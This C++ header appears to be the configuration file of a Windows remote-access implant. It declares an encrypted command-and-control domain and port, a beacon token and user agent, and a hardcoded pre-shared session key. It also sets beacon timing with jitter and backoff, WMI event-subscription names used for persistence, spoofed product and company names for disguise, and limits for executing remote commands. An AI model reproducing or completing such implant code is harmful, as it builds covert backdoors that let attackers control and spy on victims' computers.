#pragma once
#include <string>
#include <cstdint>

namespace config {

    extern const uint8_t C2_DOMAIN_ENCRYPTED[];
    extern const size_t  C2_DOMAIN_LEN;
    extern const uint16_t C2_PORT;

    const wchar_t* GetBeaconToken();
    const wchar_t* GetUserAgent();

    // ═══════════════════════════════════════════════════════════
    //  PSK – MUST MATCH worker secret SESSION_KEY_PSK
    // ═══════════════════════════════════════════════════════════
    constexpr uint8_t PSK[32] = {
        0x3a, 0x7f, 0x11, 0xc4, 0x88, 0x2b, 0xe9, 0x14,
        0x5d, 0x0a, 0x73, 0xf6, 0x99, 0xdc, 0x40, 0x27,
        0x1e, 0x8c, 0x55, 0x3b, 0xa2, 0x6d, 0xf0, 0x84,
        0xc7, 0x19, 0x4e, 0x02, 0xb8, 0x77, 0x31, 0x5f
    };

    // Beacon timing — values in SECONDS
    constexpr uint32_t BEACON_MIN = 3;
    constexpr uint32_t BEACON_MAX = 8;
    constexpr uint32_t MAX_FAILURES = 5;
    constexpr uint32_t BACKOFF_FACTOR = 3;

    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;

    constexpr DWORD CMD_OUTPUT_MAX = 65536;
    constexpr DWORD CMD_TIMEOUT_MS = 30000;
}